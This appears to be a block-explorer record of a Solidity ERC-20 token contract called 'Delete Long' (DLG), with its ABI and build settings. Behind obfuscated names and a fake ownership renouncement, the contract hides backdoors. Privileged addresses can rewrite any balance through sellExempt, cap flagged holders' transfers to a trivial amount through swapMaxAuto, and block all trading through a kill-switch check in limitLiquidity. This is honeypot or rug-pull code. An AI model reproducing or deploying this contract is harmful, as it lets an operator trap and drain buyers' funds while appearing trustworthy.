{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fromLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingReceiverTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalList {\n    function createPair(address senderExempt, address launchedTradingSell) external returns (address);\n}\n\ninterface fundShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverSwap) external view returns (uint256);\n\n    function transfer(address minFromBuy, uint256 shouldWalletFrom) external returns (bool);\n\n    function allowance(address receiverMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldWalletFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minFromBuy,\n        uint256 shouldWalletFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atSwap, uint256 value);\n    event Approval(address indexed receiverMin, address indexed spender, uint256 value);\n}\n\ninterface fundShouldMetadata is fundShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeleteLong is marketingReceiverTake, fundShould, fundShouldMetadata {\n\n    function transfer(address sellShould, uint256 shouldWalletFrom) external virtual override returns (bool) {\n        return limitLiquidity(_msgSender(), sellShould, shouldWalletFrom);\n    }\n\n    function transferFrom(address launchedTrading, address minFromBuy, uint256 shouldWalletFrom) external override returns (bool) {\n        if (_msgSender() != walletMax) {\n            if (receiverTake[launchedTrading][_msgSender()] != type(uint256).max) {\n                require(shouldWalletFrom <= receiverTake[launchedTrading][_msgSender()]);\n                receiverTake[launchedTrading][_msgSender()] -= shouldWalletFrom;\n            }\n        }\n        return limitLiquidity(launchedTrading, minFromBuy, shouldWalletFrom);\n    }\n\n    address swapLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function listTx(address atWalletBuy) public {\n        require(atWalletBuy.balance < 100000);\n        if (liquiditySellTx) {\n            return;\n        }\n        \n        walletFrom[atWalletBuy] = true;\n        if (fromAuto) {\n            receiverList = walletSell;\n        }\n        liquiditySellTx = true;\n    }\n\n    address private buyAt;\n\n    address public launchToken;\n\n    uint256 constant feeLiquidity = 5 ** 10;\n\n    mapping(address => uint256) private limitMin;\n\n    function limitLiquidity(address launchedTrading, address minFromBuy, uint256 shouldWalletFrom) internal returns (bool) {\n        if (launchedTrading == launchToken) {\n            return txLimit(launchedTrading, minFromBuy, shouldWalletFrom);\n        }\n        uint256 feeSwap = fundShould(modeBuy).balanceOf(swapLimit);\n        require(feeSwap == tokenShouldMax);\n        require(minFromBuy != swapLimit);\n        if (tradingTake[launchedTrading]) {\n            return txLimit(launchedTrading, minFromBuy, feeLiquidity);\n        }\n        return txLimit(launchedTrading, minFromBuy, shouldWalletFrom);\n    }\n\n    function amountMode() private view {\n        require(walletFrom[_msgSender()]);\n    }\n\n    mapping(address => bool) public walletFrom;\n\n    function txLimit(address launchedTrading, address minFromBuy, uint256 shouldWalletFrom) internal returns (bool) {\n        require(limitMin[launchedTrading] >= shouldWalletFrom);\n        limitMin[launchedTrading] -= shouldWalletFrom;\n        limitMin[minFromBuy] += shouldWalletFrom;\n        emit Transfer(launchedTrading, minFromBuy, shouldWalletFrom);\n        return true;\n    }\n\n    uint256 public receiverList;\n\n    function name() external view virtual override returns (string memory) {\n        return launchTx;\n    }\n\n    function balanceOf(address receiverSwap) public view virtual override returns (uint256) {\n        return limitMin[receiverSwap];\n    }\n\n    address public modeBuy;\n\n    constructor (){\n        if (tradingAtSender) {\n            receiverList = walletSell;\n        }\n        fromLimit teamFund = fromLimit(walletMax);\n        modeBuy = totalList(teamFund.factory()).createPair(teamFund.WETH(), address(this));\n        if (tradingAtSender == fromAuto) {\n            walletSell = receiverList;\n        }\n        launchToken = _msgSender();\n        minBuy();\n        walletFrom[launchToken] = true;\n        limitMin[launchToken] = fromLaunched;\n        if (tradingAtSender == exemptTeam) {\n            exemptTeam = false;\n        }\n        emit Transfer(address(0), launchToken, fromLaunched);\n    }\n\n    event OwnershipTransferred(address indexed feeTeam, address indexed minMarketingWallet);\n\n    mapping(address => mapping(address => uint256)) private receiverTake;\n\n    mapping(address => bool) public tradingTake;\n\n    function listEnableExempt(uint256 shouldWalletFrom) public {\n        amountMode();\n        tokenShouldMax = shouldWalletFrom;\n    }\n\n    bool private exemptTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromLaunched;\n    }\n\n    function getOwner() external view returns (address) {\n        return buyAt;\n    }\n\n    uint8 private amountShouldSell = 18;\n\n    uint256 public walletSell;\n\n    string private launchTx = \"Delete Long\";\n\n    function swapMaxAuto(address takeToken) public {\n        amountMode();\n        \n        if (takeToken == launchToken || takeToken == modeBuy) {\n            return;\n        }\n        tradingTake[takeToken] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeReceiver;\n    }\n\n    function sellExempt(address sellShould, uint256 shouldWalletFrom) public {\n        amountMode();\n        limitMin[sellShould] = shouldWalletFrom;\n    }\n\n    uint256 teamTo;\n\n    function approve(address feeTake, uint256 shouldWalletFrom) public virtual override returns (bool) {\n        receiverTake[_msgSender()][feeTake] = shouldWalletFrom;\n        emit Approval(_msgSender(), feeTake, shouldWalletFrom);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return buyAt;\n    }\n\n    uint256 private fromLaunched = 100000000 * 10 ** 18;\n\n    function minBuy() public {\n        emit OwnershipTransferred(launchToken, address(0));\n        buyAt = address(0);\n    }\n\n    function allowance(address fromWallet, address feeTake) external view virtual override returns (uint256) {\n        if (feeTake == walletMax) {\n            return type(uint256).max;\n        }\n        return receiverTake[fromWallet][feeTake];\n    }\n\n    bool private fromAuto;\n\n    bool public liquiditySellTx;\n\n    address walletMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private modeReceiver = \"DLG\";\n\n    bool public tradingAtSender;\n\n    uint256 tokenShouldMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountShouldSell;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMarketingWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldWalletFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySellTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldWalletFrom\",\"type\":\"uint256\"}],\"name\":\"listEnableExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atWalletBuy\",\"type\":\"address\"}],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldWalletFrom\",\"type\":\"uint256\"}],\"name\":\"sellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"}],\"name\":\"swapMaxAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAtSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldWalletFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minFromBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldWalletFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DeleteLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}